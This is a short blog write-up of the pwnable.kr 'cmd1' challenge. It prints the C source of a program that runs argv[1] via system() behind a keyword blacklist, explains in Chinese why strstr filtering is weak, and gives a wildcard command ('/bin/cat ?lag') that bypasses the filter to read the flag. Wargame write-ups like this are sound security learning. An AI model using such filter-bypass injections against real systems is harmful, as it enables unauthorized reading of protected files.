    <h1 class="article-title">
        <a href="/2017/09/23/cmd1/">Pwnable Cmd1</a>
    </h1>

    <section class="article-meta">
        <p class="article-date">September 23 2017</p>
    </section>

    <section class="article-entry">
        <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> r=<span class="number">0</span>;</div><div class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</div><div class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"sh"</span>)!=<span class="number">0</span>;</div><div class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"tmp"</span>)!=<span class="number">0</span>;</div><div class="line">	<span class="keyword">return</span> r;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</div><div class="line">	putenv(<span class="string">"PATH=/fuckyouverymuch"</span>);</div><div class="line">	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	system( argv[<span class="number">1</span>] );</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">```    </div><div class="line">    </div><div class="line">源码是这样，`filter`函数中有个`<span class="built_in">strstr</span>`函数，这个函数搜索一个字符串在另一个字符串中的第一次出现，若存在，则返回子串在字符串中首次出现的位置，若不存在返回<span class="literal">NULL</span>。所以只要`argv`中不出现`flag`,`sh`,`tmp`字符串则会执行`system`,所以构造命令：</div><div class="line">```.sh</div><div class="line">./cmd1 <span class="string">"/bin/cat ?lag</span></div></pre></td></tr></table></figure>
    </section>
